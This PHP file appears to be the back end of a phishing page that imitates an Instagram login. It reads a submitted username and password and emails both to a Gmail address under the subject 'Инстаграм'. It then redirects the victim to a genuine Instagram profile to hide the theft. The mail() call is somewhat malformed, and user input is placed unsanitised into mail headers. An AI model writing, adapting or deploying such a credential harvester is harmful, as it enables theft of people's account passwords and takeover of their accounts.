<?php
session_start();


unset($_SESSION['error_name']);
unset($_SESSION['error_password']);



    function redirct(){
        header('Location: index.php');
        exit;
}



$name = $_POST['username'];
$password = $_POST['password'];




$_SESSION['name'] = $name;
$_SESSION['password'] = $password;









if (trim($name)== ""){
    $_SESSION['error_name']= 'Ведите имя';
    redirct();
}
   
else if(trim($password) == ""){
    $_SESSION['error_password'] = 'Введите пароль';
    redirct();
}
    
else{
    $subject = "=?utf-8?B?".base64_encode("Инстаграм")."?=";
    $headers = "From: $name\r\nReply-to: $name\r\nContent-type: text/html;charset=utf-8\r\n";
    
    mail('joing3479@gmail.com',$name, $subject, $password, $headers);
    header('Location: https://www.instagram.com/yura20737/');
}




// foreach ($_pOST as $key => $value) {
//     echo $value;
// }